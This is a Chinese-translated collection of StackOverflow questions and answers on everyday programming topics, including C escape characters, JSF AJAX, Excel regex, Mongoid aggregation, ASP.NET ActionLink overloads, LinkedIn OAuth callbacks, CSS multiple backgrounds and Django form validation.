# StackOverflow 问答 12014000-12014999

# c++ - C\C++：初始化 ASCII 特殊字符？

> ID：12014000
> 
> 赞同：3
> 
> 时间：2012-08-17T22:28:02.193
> 
> 标签：c++, c, char, ascii

如何初始化特殊的 ASCII 字符，例如 EOT (0x04)、ENQ(0x05)？

```
char CHAR1 = '\EOT';
char CHAR2 = '\ENQ'; 
```

这个对吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-17T22:29:57.353

您可以将字符代码放入变量中：

```
char CHAR1 = 4;
char CHAR2 = 5; 
```

您还可以使用您可以[在此处](http://en.cppreference.com/w/cpp/language/escape)找到的转义序列。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-17T22:30:03.547

通过十六进制或八进制，不支持它们的名称。`'\x04'`例如。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-17T22:34:10.433

您可以简单地将 char 分配给它的十六进制值：

```
char CHAR1 = 0x04; 
```

这个对吗 ？- 不，你初始化它的方式是不正确的，因为编译器期望在 '\' 之后有一个转义字符

# java - 通过 EntityManager 查找在 JSF 页面上使用 AJAX 设置标签

> ID：12014003
> 
> 赞同：0
> 
> 时间：2012-08-17T22:28:37.280
> 
> 标签：java, jsf, jakarta-ee

我试图通过搜索参考来获取名称。相关的方法是调用 EM 并使用键 Reference 搜索对象的 getReference()。然后我尝试获取一个返回对象的属性名称。包 MBJSFControllers；

```
import entities.Armazem;
import MBJSFControllers.util.JsfUtil;
import MBJSFControllers.util.PaginationHelper;
import SessionBeans.ArmazemFacade;

import java.io.Serializable;
import java.util.ResourceBundle;
import javax.ejb.EJB;
import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;
import javax.faces.component.UIComponent;
import javax.faces.context.FacesContext;
import javax.faces.convert.Converter;
import javax.faces.convert.FacesConverter;
import javax.faces.model.DataModel;
import javax.faces.model.ListDataModel;
import javax.faces.model.SelectItem;
import javax.persistence.EntityManager;

@ManagedBean(name = "armazemController")
@SessionScoped
public class ArmazemController implements Serializable {

    private int Reference;
    private String replyWith;

    private Armazem current;
    private DataModel items = null;
    @EJB
    private SessionBeans.ArmazemFacade ejbFacade;
    private PaginationHelper pagination;
    private int selectedItemIndex;

    public ArmazemController() {
    }

    public Armazem getSelected() {
        if (current == null) {
            current = new Armazem();
            selectedItemIndex = -1;
        }
        return current;
    }

    private ArmazemFacade getFacade() {
        return ejbFacade;
    }

    public PaginationHelper getPagination() {
        if (pagination == null) {
            pagination = new PaginationHelper(10) {

                @Override
                public int getItemsCount() {
                    return getFacade().count();
                }

                @Override
                public DataModel createPageDataModel() {
                    return new ListDataModel(getFacade().findRange(new int[]{getPageFirstItem(), getPageFirstItem() + getPageSize()}));
                }
            };
        }
        return pagination;
    }

    public String prepareList() {
        recreateModel();
        return "List";
    }

    public String prepareView() {
        current = (Armazem) getItems().getRowData();
        selectedItemIndex = pagination.getPageFirstItem() + getItems().getRowIndex();
        return "View";
    }

    public String prepareCreate() {
        current = new Armazem();
        selectedItemIndex = -1;
        return "Create";
    }

    public String create() {
        try {
            getFacade().create(current);
            JsfUtil.addSuccessMessage(ResourceBundle.getBundle("/Bundle").getString("ArmazemCreated"));
            return prepareCreate();
        } catch (Exception e) {
            JsfUtil.addErrorMessage(e, ResourceBundle.getBundle("/Bundle").getString("PersistenceErrorOccured"));
            return null;
        }
    }

    public String prepareEdit() {
        current = (Armazem) getItems().getRowData();
        selectedItemIndex = pagination.getPageFirstItem() + getItems().getRowIndex();
        return "Edit";
    }

    public String update() {
        try {
            getFacade().edit(current);
            JsfUtil.addSuccessMessage(ResourceBundle.getBundle("/Bundle").getString("ArmazemUpdated"));
            return "View";
        } catch (Exception e) {
            JsfUtil.addErrorMessage(e, ResourceBundle.getBundle("/Bundle").getString("PersistenceErrorOccured"));
            return null;
        }
    }

    public String destroy() {
        current = (Armazem) getItems().getRowData();
        selectedItemIndex = pagination.getPageFirstItem() + getItems().getRowIndex();
        performDestroy();
        recreatePagination();
        recreateModel();
        return "List";
    }

    public String destroyAndView() {
        performDestroy();
        recreateModel();
        updateCurrentItem();
        if (selectedItemIndex >= 0) {
            return "View";
        } else {
            // all items were removed - go back to list
            recreateModel();
            return "List";
        }
    }

    private void performDestroy() {
        try {
            getFacade().remove(current);
            JsfUtil.addSuccessMessage(ResourceBundle.getBundle("/Bundle").getString("ArmazemDeleted"));
        } catch (Exception e) {
            JsfUtil.addErrorMessage(e, ResourceBundle.getBundle("/Bundle").getString("PersistenceErrorOccured"));
        }
    }

    private void updateCurrentItem() {
        int count = getFacade().count();
        if (selectedItemIndex >= count) {
            // selected index cannot be bigger than number of items:
            selectedItemIndex = count - 1;
            // go to previous page if last page disappeared:
            if (pagination.getPageFirstItem() >= count) {
                pagination.previousPage();
            }
        }
        if (selectedItemIndex >= 0) {
            current = getFacade().findRange(new int[]{selectedItemIndex, selectedItemIndex + 1}).get(0);
        }
    }

    public DataModel getItems() {
        if (items == null) {
            items = getPagination().createPageDataModel();
        }
        return items;
    }

    private void recreateModel() {
        items = null;
    }

    private void recreatePagination() {
        pagination = null;
    }

    public String next() {
        getPagination().nextPage();
        recreateModel();
        return "List";
    }

    public String previous() {
        getPagination().previousPage();
        recreateModel();
        return "List";
    }

    public SelectItem[] getItemsAvailableSelectMany() {
        return JsfUtil.getSelectItems(ejbFacade.findAll(), false);
    }

    public SelectItem[] getItemsAvailableSelectOne() {
        return JsfUtil.getSelectItems(ejbFacade.findAll(), true);
    }

    /**
     * @return the Reference
     */
    public int getReference() {
        if(Reference > 0){
            replyWith = "Duck";
        }else{
            replyWith = "Fruck";
        }
        EntityManager em;
        Armazem find = em.find(Armazem.class, Reference);
        replyWith = find.getNome();
        return Reference;
    }

    /**
     * @param Reference the Reference to set
     */
    public void setReference(int Reference) {
        this.Reference = Reference;
    }

    @FacesConverter(forClass = Armazem.class)
    public static class ArmazemControllerConverter implements Converter {

        public Object getAsObject(FacesContext facesContext, UIComponent component, String value) {
            if (value == null || value.length() == 0) {
                return null;
            }
            ArmazemController controller = (ArmazemController) facesContext.getApplication().getELResolver().
                    getValue(facesContext.getELContext(), null, "armazemController");
            return controller.ejbFacade.find(getKey(value));
        }

        java.lang.Integer getKey(String value) {
            java.lang.Integer key;
            key = Integer.valueOf(value);
            return key;
        }

        String getStringKey(java.lang.Integer value) {
            StringBuffer sb = new StringBuffer();
            sb.append(value);
            return sb.toString();
        }

        public String getAsString(FacesContext facesContext, UIComponent component, Object object) {
            if (object == null) {
                return null;
            }
            if (object instanceof Armazem) {
                Armazem o = (Armazem) object;
                return getStringKey(o.getIdarmazem());
            } else {
                throw new IllegalArgumentException("object " + object + " is of type " + object.getClass().getName() + "; expected type: " + ArmazemController.class.getName());
            }
        }
    }
} 
```

Get reference 在此 JSF 页面中被称为 ajax 函数：

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core">
    <h:head>
        <title>Facelet Title</title>
    </h:head>
    <h:body>
        Hello from Facelets
        <p>Numero de armazens</p>
        <h:form> 
            <h:panelGrid> 
                <h:inputText value="#{armazemController.reference}" > 
                    <f:ajax event="keyup"/> 
                </h:inputText> 
                <h:outputText id="text" value="#{armazemController.replyWith}" /> 
            </h:panelGrid> 
        </h:form>
    </h:body>
</html> 
```

我似乎无法让这个工作。我究竟做错了什么？我正在尝试完成一个简单的任务，给定一个引用参数查找存在的实体并显示与该引用关联的名称。我已经搜索并阅读了很多文章，但我仍然没有弄清楚 JSF 和 MB 应该如何工作，我已经使用 NB 向导创建了 JPA 和 JSF+Controllers，我需要有使用多个 bean 的 JSF 页面，我有没有找到一个简单的方法来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-20T11:43:34.087

这里，

```
/**
 * @return the Reference
 */
public int getReference() {
    if(Reference > 0){
        replyWith = "Duck";
    }else{
        replyWith = "Fruck";
    }
    EntityManager em;
    Armazem find = em.find(Armazem.class, Reference);
    replyWith = find.getNome();
    return Reference;
} 
```

您已经在 getter 方法中实现了“业务逻辑”。这是绝对不对的。Getter 和 setter 根本不应该包含业务逻辑。导致您的具体问题是因为从未在 ajax 请求上调用此 getter。仅调用输入的设置器。此外，您没有通过 ajax 渲染任何内容，因此最终用户根本得不到任何视觉反馈。Zak 的回答涵盖了这一点，但仅此还不够。它只会调用文本的 getter，而不是输入的 setter。

您需要改为在正常操作方法中执行业务逻辑。然后，您可以将该方法绑定到 的`listener`属性`<f:ajax>`。

```
<h:inputText value="#{armazemController.reference}" > 
    <f:ajax event="keyup" listener="#{armazemController.referenceOnkeyup}" render="text" /> 
</h:inputText> 
<h:outputText id="text" value="#{armazemController.replyWith}" /> 
```

和

```
private int reference;
private String replyWith;

public void referenceOnkeyup() {
    replyWith = em.find(Armazem.class, Reference).getNome();
}

public int getReference() {
    return reference;
}

public void setReference(int reference) {
    this.reference = reference;
}

public String getReplyWith() {
    return replyWith;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:27:45.300

尝试这个：

```
 <h:inputText value="#{armazemController.reference}" > 
                <f:ajax event="keyup" render="text"/> 
            </h:inputText> 
            <h:outputText id="text" value="#{armazemController.replyWith}" /> 
```

您似乎跳过了 ajax 的渲染部分。目前正在服务器上处理 inputText，但之后不会重新渲染任何内容。

# regex - 正则表达式选择第三次出现之后的所有内容

> ID：12014005
> 
> 赞同：0
> 
> 时间：2012-08-17T22:28:42.127
> 
> 标签：regex, excel, openoffice-calc

我有一组 excel 单元格，我需要使用更复杂的 RegEx 来删除所有内容，包括第三次出现的“|” - （空格、管道、空格）——某些单元格的出现次数可能更少甚至为 0 ，而其他人可能有 10-20+。总共有大约 40,000 个单元格，全部在一个列中

```
Canon USA BJC 3000 | BJC 3010 | BJC 6000 | C755 | F30 | F50 | F60 | F80 | I550 | I850 | MP700 | MP730 | S400 | S450 | S500 | S520 | S530 | S600 | S630 | S750 Black Ink Cartridge 420 yield - 4479A003 
```

应该成为

```
Canon USA BJC 3000 | BJC 3010 | BJC 6000 
```

关于从哪里开始的任何建议，或者一个适当的正则表达式来拉这个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T22:40:34.810

不完全确定 Excel 中的正则表达式是如何工作的，但类似以下内容应该可以工作：

```
((?:[^\|]*\|){2}[^\|]*).* 
```

将其替换为第一个捕获组的内容（通常是`\1`或`$1`）。

示例：[http ://gskinner.com/RegExr/?31sbq](http://gskinner.com/RegExr/?31sbq)

解释：

```
(                  # start capture group 1
  (?:                # start non-capturing group, repeated exactly twice
     [^\|]*\|          # match any number of non '|' followed by '|' 
  ){2}               # end non-capturing group
  [^\|]*             # match any number of non '|'
)                  # end capturing group
.*                 # match to end of string 
```

通过将其替换为第一个捕获组，`.*`将删除匹配的所有内容。

# iframe - 使用 mp4 文件停止 iframe 自动播放

> ID：12014006
> 
> 赞同：1
> 
> 时间：2012-08-17T22:28:50.350
> 
> 标签：iframe

我想阻止 iframe 中的 .mp4 文件自动播放。

代码很简单：

```
var siteVidUrl = document.createElement("iframe");  // create iframe
siteVidUrl.src = Obj.URL + "?autoplay=0"; // create src attribute for iframe
link_col.appendChild(siteVidUrl); // append to DOM 
```

Obj.URL 的一个例子是

```
media.website.com/theVideo.mp4 
```

尽管我尽了最大努力，视频仍会自动播放。如您所见，我将“？autoplay=0”附加到 src 属性 URL 的末尾，但没有运气。我已经阅读了一些关于视频 HTML5 标签的内容，但也没有运气......

大多数视频是 .mp4 文件。

谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T22:56:08.667

是否有必要为此使用 iframe？如果没有查看 HTML5 视频标签：[https ://www.w3schools.com/htmL/html5_video.asp](https://www.w3schools.com/htmL/html5_video.asp)

如果需要 iframe（出于任何原因），您可以将 src 设置为一个页面，该页面接收视频的 URL 作为参数，并生成包含简单视频标签的 HTML。这样您就可以控制视频播放并禁用自动播放。

# javascript - 使用多功能框在 chrome 扩展中包含内联自动完成的任何方式

> ID：12014008
> 
> 赞同：1
> 
> 时间：2012-08-17T22:29:19.210
> 
> 标签：javascript, google-chrome, google-chrome-extension

我创建了一个使用多功能框的简单 chrome 扩展，并根据用户在地址栏中输入的内容提供建议的结果。我想知道是否有任何建议的结果可以显示为内联自动完成，而不是在用户条目下方？

谢谢

编辑：

这是我正在做的一个示例。基本上每次用户在地址栏中输入内容时，我都会得到一些建议的结果并将它们扔到建议回调中，该回调显示了堆叠在地址栏下的那些关键字。想知道是否无论如何我也可以提供该数组中的最上面的单词作为内联自动完成。对不起，如果问题不够清楚。

```
chrome.omnibox.onInputChanged.addListener(function(text, suggest){
       var baseUrl = "http://sample.com";
       var finalResult = [];
              $.ajax({
                     url : baseUrl,
                     dataType : "jsonp",
                     success: function(result) {
                                     for (var i=0; i<result[1].legnth; i++){
                                          finalResult.push(
                                                 {content : result[1][i], description : result[1][i]}
                                          );
                                     }
                                     suggest(finalResult);
                              },
                     async: false
              });           
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:11:52.707

不可以。目前没有办法使用多功能框 API 来内联而不是在地址栏下填充建议作为选项。[https://developer.chrome.com/extensions/omnibox.html](https://developer.chrome.com/extensions/omnibox.html)

查看文档的开发版本并没有显示 API 即将发生的任何更改[https://developer.chrome.com/dev/extensions/omnibox.html](https://developer.chrome.com/dev/extensions/omnibox.html)

# ruby-on-rails - 轨道中的 Mongoid Group By 或 MongoDb group by

> ID：12014009
> 
> 赞同：4
> 
> 时间：2012-08-17T22:29:23.090
> 
> 标签：ruby-on-rails, ruby-on-rails-3, mongodb, mongoid, ruby-on-rails-3.2

我有一个 mongo 表，其中包含如下统计数据....

*   course_id
*   地位`which is a string, played or completed`
*   和时间戳信息使用[Mongoid 的时间戳功能](http://mongoid.org/en/mongoid/docs/extras.html#timestamps)

所以我的课如下......

```
class Statistic
  include Mongoid::Document
  include Mongoid::Timestamps
  include Mongoid::Paranoia

  field :course_id, type: Integer
  field :status, type: String # currently this is either play or complete 
```

我想每天计算一门课程的总播放次数。例如... 12 年 8 月 1 日有 2 场比赛，2012 年 8 月 2 日有 6 场比赛。等等。因此，我将使用 created_at 时间戳字段，以及 course_id 和 action。问题是我在 Mongoid 中没有看到按方法分组。我相信 mongodb 现在有一个，但我不确定如何在 rails 3 中完成。

我可以使用每一个来遍历表，并在 Rails 中以增量方式将一些地图或哈希组合在一起，但是如果课程有 100 万个视图，那么检索和迭代超过一百万条记录可能会很混乱。有没有一种干净的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-20T08:10:13.663

如评论中所述，您可以为此目的使用 map/reduce。因此，您可以在模型中定义以下方法（[http://mongoid.org/en/mongoid/docs/querying.html#map_reduce](http://mongoid.org/en/mongoid/docs/querying.html#map_reduce)）

```
def self.today
  map = %Q{
    function() {
      emit(this.course_id, {count: 1})
    }
  }

  reduce = %Q{
    function(key, values) {
      var result = {count: 0};
      values.forEach(function(value) {
        result.count += value.count;
      });
      return result;
    }
  }

  self.where(:created_at.gt => Date.today, status: "played").
    map_reduce(map, reduce).out(inline: true)
end 
```

这将导致以下结果：

```
[{"_id"=>1.0, "value"=>{"count"=>2.0}}, {"_id"=>2.0, "value"=>{"count"=>1.0}}] 
```

其中`_id`是`course_id`并且`count`是播放次数。

MongoDB中也有专门的[组](http://www.mongodb.org/display/DOCS/Aggregation#Aggregation-Group)方法，但我不确定如何访问 Mongoid 3 中的裸 mongodb 集合。我还没有机会深入研究代码。

您可能想知道为什么我发出一个文档`{count: 1}`，因为它并不重要，我可以只发出空文档或任何东西，然后总是为每个值在 result.count 中加 1。问题是，如果只对特定键进行了一次发射（在我的示例中只播放了一次），则不会调用 reduce，`course_id`因此最好以与结果相同的格式发射文档。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-01-08T12:24:25.087

**使用 Mongoid**

```
stages =  [{ 
         "$group" => {  "_id" => { "date_column_name"=>"$created_at" }},
         "plays_count" => { "$sum" => 1 }
    }]
@array_of_objects = ModelName.collection.aggregate(stages, {:allow_disk_use => true}) 
```

**或者**

```
stages =  [{ 
          "$group" => {  
             "_id" => { 
                       "year" => { "$year" => "$created_at" },
                       "month" => { "$month" => "$created_at" },
                       "day" => { "$dayOfMonth" => "$created_at" }
              }
           },
          "plays_count" => { "$sum" => 1 }
    }]
@array_of_objects = ModelName.collection.aggregate(stages, {:allow_disk_use => true}) 
```

**按照下面的链接使用 mongoid 进行分组**

[https://taimoorchangaizpucitian.wordpress.com/2016/01/08/mongoid-group-by-query/](https://taimoorchangaizpucitian.wordpress.com/2016/01/08/mongoid-group-by-query/) [https://docs.mongodb.org/v3.0/reference/operator/aggregation/group/](https://docs.mongodb.org/v3.0/reference/operator/aggregation/group/)

# asp.net-mvc - ASP.NET MVC - 在视图之间传递值

> ID：12014010
> 
> 赞同：0
> 
> 时间：2012-08-17T22:29:41.953
> 
> 标签：asp.net-mvc, view

我有 2 个视图：问题和答案。从问题视图，详细操作我想重定向到答案视图，创建操作，所以我放置了：

```
@Html.ActionLink(Model.QuestionId.ToString(), "Create", "Answer", "Answer", new { id = Model.QuestionId }) 
```

在答案视图中：

```
public ActionResult Create(string id)
{
    (...)
    return View();
} 
```

但是 Create(string id) 中的 id 始终为空。我怎样才能正确传递这个值？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T22:33:42.797

您使用了错误的 ActionLink 帮助程序[重载](http://msdn.microsoft.com/en-us/library/system.web.mvc.html.linkextensions.actionlink.aspx)。它应该是：

```
@Html.ActionLink(
    Model.QuestionId.ToString(),     // linkText
    "Create",                        // actionName
    "Answer",                        // controllerName
    new { id = Model.QuestionId },   // routeValues
    null                             // htmlAttributes
) 
```

这会产生

```
<a href="/answer/create/123">123</a> 
```

* * *

而您正在使用：

```
@Html.ActionLink(
    Model.QuestionId.ToString(),     // linkText
    "Create",                        // actionName
    "Answer",                        // controllerName
    "Answer",                        // routeValues
    new { id = Model.QuestionId }    // htmlAttributes
) 
```

生成：

```
<a href="/Answer/Create?Length=6" id="123">123</a> 
```

我认为现在不难理解为什么你的锚不起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T22:33:35.077

您似乎选择了错误的`ActionLink`重载。尝试这个：

```
@Html.ActionLink(Model.QuestionId.ToString(), "Create", "Answer", new { id = Model.QuestionId }, null) 
```

# php - 在 PHP 中没有调用 Linkedin OAuth 回调？

> ID：12014015
> 
> 赞同：1
> 
> 时间：2012-08-17T22:30:12.683
> 
> 标签：php, oauth, linkedin, access-token

就像[这个没有答案](https://stackoverflow.com/questions/8560945/linkedin-oauth-callback-url)的问题一样，我正在尝试通过 PHP/OAuth 连接到 Linked in。我得到了令牌。一切正常。但由于某种原因，Linkedin 不会返回我的回调 URL 并要求输入 PIN 码？帮助？

从文档来看，只有在没有回调 URL 的情况下才会发生这种情况？

```
$token = $linkedInOAuth->getRequestToken();

array(5) {
  ["oauth_token"]=>
  string(36) "[valad_token]"
  ["oauth_token_secret"]=>
  string(36) "[valad_secret]"
  ["oauth_callback_confirmed"]=>
  string(4) "true"
  ["xoauth_request_auth_url"]=>
  string(44) "https://api.linkedin.com/uas/oauth/authorize"
  ["oauth_expires_in"]=>
  string(3) "599"
}

$linkedInOAuth->getAuthorizeURL($token, site_url('practice/linkedin_auth_callback'));

string(169) "https://api.linkedin.com/uas/oauth/authorize?oauth_token=[valad_token]&oauth_callback=http%3A%2F%2Fwww.core.me%2Fpractice%2Flinkedin_auth_callback" 
```

然后将链接放入 a`<a href="<?= $auth_url ?>">Click here to Auth Linked in</a>`但是当用户进入并登录时 - 它会进入 PIN 页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T22:36:42.207

看起来 LinkedIn API 使用 Oauth 1.0a，您需要在获取初始请求令牌时传递回调 url。

看[这里](https://developer.linkedin.com/documents/getting-oauth-token)

或者阅读[Oauth 1.0a 规范](http://oauth.net/core/1.0a/#auth_step1)

他们将存储它，然后当用户授权请求令牌时，它将回调到针对该请求令牌存储的 url。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-12T18:33:17.623

这是由 WayneC 的回答提供的工作代码：

```
 $linkedInOAuth = $this->load->library('practice/linkedInOAuth', array(
            'consumer_key' => '[KEY]',
            'consumer_secret' => '[SECRET]'
                )
        );

        $linkedInOAuth->request_options = array(
            'oauth_callback' => site_url('practice/linkedin_auth_callback')
        );
        $token = $linkedInOAuth->getRequestToken();

        if ($token === FALSE) {
            show_error("Failed to get token", "502", "Failed to get Linked in Access token");
        }

        $auth_url = $linkedInOAuth->getAuthorizeURL($token, site_url('practice/linkedin_auth_callback')); 
```

它使用这些类：

*   LinkedINOAuth：[https ://github.com/petewarden/linkedinoauthexample](https://github.com/petewarden/linkedinoauthexample)
*   OAuth： http: [//oauth.googlecode.com/svn/code/php/OAuth.php](http://oauth.googlecode.com/svn/code/php/OAuth.php)

# ios - 删除用户实体以及Core Data中与实体相关的所有数据

> ID：12014018
> 
> 赞同：0
> 
> 时间：2012-08-17T22:30:26.073
> 
> 标签：ios, core-data, cascading-deletes

我有一个核心数据模型，例如与多个实体有关系的用户实体。当我尝试删除核心数据中的用户时，我需要删除与用户实体相关的所有实体。

如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T06:12:30.313

最简单的方法是转到 Core Data 模型编辑器中的所有关系，选择每个关系并选择`Delete Rule`（预设为`Nullify`）为`Cascade`.

现在所有依赖实体也将被删除。

这是[Core Data Programming Guide](http://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreData/cdProgrammingGuide.html)中的[相关部分](http://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/CoreData/Articles/cdRelationships.html#//apple_ref/doc/uid/TP40001857-SW1)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T22:48:19.287

您需要为您的关系设置删除规则。 `NSCascadeDeleteRule`将通过关系级联删除。

您可以在文档中找到有关每个删除规则的完整详细信息。单击管理器/文档并输入以`NSDeleteRule`获取更多详细信息。

# html - CSS 继承样式

> ID：12014019
> 
> 赞同：1
> 
> 时间：2012-08-17T22:30:29.173
> 
> 标签：html, css

我有这个下拉菜单，我正在使用 CSS 来“突出显示”我悬停的项目。我的问题是我只想在具有下拉类别的项目上显示这个向下箭头，下面是我如何在 HTML 中调用它。我给了它“子项”标签。所以我创建了以下 CSS 来显示箭头。问题是 .subitem 属性覆盖了一般的悬停属性，所以当我将鼠标悬停在它上面时我只看到箭头，有没有办法可以同时看到两者？

## ![在此处输入图像描述](../Images/7459bdf5c219da55ea89e29f922c04bc.png)

```
#cssmenu  > ul > li.subitem 

{
    padding-right:5px;
background: url(images/arrow2.png) no-repeat;

background-position-y: 10%;

}

#cssmenu  > ul  li.subitem:hover

{

background: url(images/arrow2.png) no-repeat;

} 
```

* * *

```
<div id='cssmenu'>
<ul>
   <li><a href='index.html'><span>Home</span></a></li>
    <li class='subitem'><a href='#'><span>Products</span></a>
      <ul>
         <li><a href='#'><span>Product 1</span></a></li>
         <li><a href='#'><span>Product 2</span></a></li>
      </ul>
   </li> 
```

* * *

```
#cssmenu  > ul li:hover{

    padding : 3 px, 1 px;
background: #828a91; /* Old browsers */
background: -moz-linear-gradient(top,  #828a91 0%, #636363 100%); /* FF3.6+ */
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#828a91), color-stop(100%,#636363)); /* Chrome,Safari4+ */
background: -webkit-linear-gradient(top,  #828a91 0%,#636363 100%); /* Chrome10+,Safari5.1+ */
background: -o-linear-gradient(top,  #828a91 0%,#636363 100%); /* Opera 11.10+ */
background: -ms-linear-gradient(top,  #828a91 0%,#636363 100%); /* IE10+ */
background: linear-gradient(to bottom,  #828a91 0%,#636363 100%); /* W3C */
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#828a91', endColorstr='#636363',GradientType=0 ); /* IE6-9 */
 -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.5), inset 0 -2px 0 rgba(0,0,0,.25), inset 0 -3px 0 rgba(255,255,255,.2), 0 1px 0 rgba(0,0,0,.1);
    -moz-box-shadow: inset 0 1px 0 rgba(255,255,255,.5), inset 0 -2px 0 rgba(0,0,0,.25), inset 0 -3px 0 rgba(255,255,255,.2), 0 1px 0 rgba(0,0,0,.1);
    box-shadow: inset 0 1px 0 rgba(255,255,255,.5), inset 0 -2px 0 rgba(0,0,0,.25), inset 0 -3px 0 rgba(255,255,255,.2), 0 1px 0 rgba(0,0,0,.1);

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T22:40:59.407

`#cssmenu > ul li.subitem:hover`将您的规则更改为：

```
background: #828a91; /* Old browsers */
background: url(images/arrow2.png) no-repeat, -moz-linear-gradient(top,  #828a91 0%, #636363 100%); /* FF3.6+ */
background: url(images/arrow2.png) no-repeat, -webkit-gradient(linear, left top, left bottom, color-stop(0%,#828a91), color-stop(100%,#636363)); /* Chrome,Safari4+ */
background: url(images/arrow2.png) no-repeat, -webkit-linear-gradient(top,  #828a91 0%,#636363 100%); /* Chrome10+,Safari5.1+ */
background: url(images/arrow2.png) no-repeat, -o-linear-gradient(top,  #828a91 0%,#636363 100%); /* Opera 11.10+ */
background: url(images/arrow2.png) no-repeat, -ms-linear-gradient(top,  #828a91 0%,#636363 100%); /* IE10+ */
background: url(images/arrow2.png) no-repeat, linear-gradient(to bottom,  #828a91 0%,#636363 100%); /* W3C */ 
```

这使用了这样一个事实，即在**CSS3**`background`中，您可以通过用逗号分隔简写定义来指定多个s。这是一个 Web 资源，您可以在其中阅读有关指定多个背景的更多信息：[little link](http://www.css3.info/preview/multiple-backgrounds/)。
我希望这有帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T22:40:06.113

您必须为 .subitem:hover 样式重复如下所示的悬停样式

```
#cssmenu  > ul  li.subitem:hover
{

padding : 3 px, 1 px;
background: #828a91 url(images/arrow2.png) no-repeat; /* Old browsers */
background: -moz-linear-gradient(top,  #828a91 0%, #636363 100%), url(images/arrow2.png) no-repeat; /* FF3.6+ */
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#828a91), color-stop(100%,#636363)),url(images/arrow2.png) no-repeat; /* Chrome,Safari4+ */
background: -webkit-linear-gradient(top,  #828a91 0%,#636363 100%),url(images/arrow2.png) no-repeat; /* Chrome10+,Safari5.1+ */
background: -o-linear-gradient(top,  #828a91 0%,#636363 100%),url(images/arrow2.png) no-repeat; /* Opera 11.10+ */
background: -ms-linear-gradient(top,  #828a91 0%,#636363 100%),url(images/arrow2.png) no-repeat; /* IE10+ */
background: linear-gradient(to bottom,  #828a91 0%,#636363 100%),url(images/arrow2.png) no-repeat; /* W3C */
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#828a91', endColorstr='#636363',GradientType=0 ); /* IE6-9 */
-webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.5), inset 0 -2px 0 rgba(0,0,0,.25), inset 0 -3px 0 rgba(255,255,255,.2), 0 1px 0 rgba(0,0,0,.1);
-moz-box-shadow: inset 0 1px 0 rgba(255,255,255,.5), inset 0 -2px 0 rgba(0,0,0,.25), inset 0 -3px 0 rgba(255,255,255,.2), 0 1px 0 rgba(0,0,0,.1);
box-shadow: inset 0 1px 0 rgba(255,255,255,.5), inset 0 -2px 0 rgba(0,0,0,.25), inset 0 -3px 0 rgba(255,255,255,.2), 0 1px 0 rgba(0,0,0,.1);

} 
```

如果你仔细看，诀窍是在同一个 css 属性中设置两个图像

```
background: <image1>, <image2>; 
```

意思是

```
background: -moz-linear-gradient(top,  #828a91 0%, #636363 100%), url(images/arrow2.png) no-repeat; 
```

# android - 当我改变活动时调用什么方法？

> ID：12014029
> 
> 赞同：-1
> 
> 时间：2012-08-17T22:31:28.477
> 
> 标签：android, android-activity, android-lifecycle, android-event

我有一个 MediaPlayer，当我更改活动时，甚至在我点击手机上的物理主页按钮时，它都会继续播放。如何使 MediaPlayer 在我更改活动时继续播放，但在我单击主屏幕按钮时停止播放？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T01:34:19.163

您可以使用服务。一直在后台运行。

该服务类似于正常活动，但它们在后台运行并且没有用户界面

# django - 验证内联外键字段

> ID：12014034
> 
> 赞同：1
> 
> 时间：2012-08-17T22:32:33.040
> 
> 标签：django, inline

我在尝试验证表单时遇到问题，以便它只选择一个不同的合作伙伴。这些类的工作方式如下：

```
class EmpployeeAdmin(admin.ModelAdmin):
    #.......

class EmployeeRoles(models.Model):
      partner = model.ForeignKey(Partner, relative_name='employee')
      employee = model.ForeignKey(Employee, relative_name='partner')

class EmployeeRolesInline(admin.TabularInline):
      model = EmployeeRoles
      extra = 0
      form = EmployeeRolesForm 
```

在我的 forms.py 中，我使用 clean_partner 函数来尝试验证当前 Employee 只有一个同名的合作伙伴。他们可以有多个不同合作伙伴的 EmployeeRoles 对象，但他们只能被分配一次合作伙伴。

```
class EmployeeRolesForm(forms.ModelForm):
      def clean_partner(self):
          partner = self.cleaned_data.get('partner')
          partner_ids=[int(p.partner_id) for p in self.instance.employee.partners.all()]
          if self.instance.partner_id is not None:
             return
          else:
             if partner.id in partner_ids:
                raise forms.ValidationError("Partner already chosen") 
```

